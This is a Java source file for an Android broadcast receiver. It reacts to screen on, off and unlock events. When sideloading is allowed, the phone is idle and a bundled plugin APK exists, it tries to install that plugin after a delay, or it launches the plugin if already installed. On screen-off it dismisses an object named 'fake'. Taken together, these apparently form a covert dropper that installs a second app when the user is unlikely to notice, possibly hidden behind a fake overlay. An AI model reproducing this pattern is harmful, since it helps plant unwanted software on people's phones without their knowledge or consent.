package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.*;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-15
 * Time: PM2:41
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]]" +
                        " Phone Model : " + android.os.Build.MODEL +
                        " >>>>>");
        if (intent != null
                && intent.getAction() != null
                && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
                    || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));

                int open = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                int state = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;

                //try to install
                SettingManager.getInstance().init(context);
                if (!SettingManager.getInstance().getKeyPluginInstalled()
                        && !SettingManager.getInstance().getKeyHasScaned()) {
                    boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                    SettingManager.getInstance().setKeyPluginInstalled(installed);
                    SettingManager.getInstance().setKeyHasScaned(true);
                }

                boolean pluginInstalled = SettingManager.getInstance().getKeyPluginInstalled();
//                                            ? true
//                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                long cur = System.currentTimeMillis();
                if (Config.DEBUG) {
                    Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] check if should install plugin : ( pluginInstalled = " + pluginInstalled
                                    + " lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
                                    + " install delay = " + SettingManager.getInstance().getKeyInstallInterval()
                                    + " current time = " + UtilsRuntime.debugFormatTime(cur)
                                    + " apk exist = " + UtilOperator.isPluginApkExist()
                                    + " open install NO market APP = " + open
                                    + " phone state = " + state);
                }
                if (open != 0
                        && state == TelephonyManager.CALL_STATE_IDLE
                        && UtilOperator.isPluginApkExist()
                        && !pluginInstalled
                        && SettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES) {
                    if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
                        if (!Config.DIS_INSTALL) UtilOperator.tryToInstallPluginLocal(context);
                    }
                } else if (pluginInstalled) {
                    Utils.tryToActivePluginApp(context);
                }
            } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));

                //try to install
                SettingManager.getInstance().init(context);
                if (!SettingManager.getInstance().getKeyPluginInstalled()
                        && !SettingManager.getInstance().getKeyHasScaned()) {
                    boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                    SettingManager.getInstance().setKeyPluginInstalled(installed);
                    SettingManager.getInstance().setKeyHasScaned(true);
                }

//                //激活子程序
//                if (SettingManager.getInstance().getKeyPluginInstalled()) {
//                    Utils.tryToActivePluginApp(context);
//                }

                UtilOperator.fake.dismiss();
            }
        }
    }

}
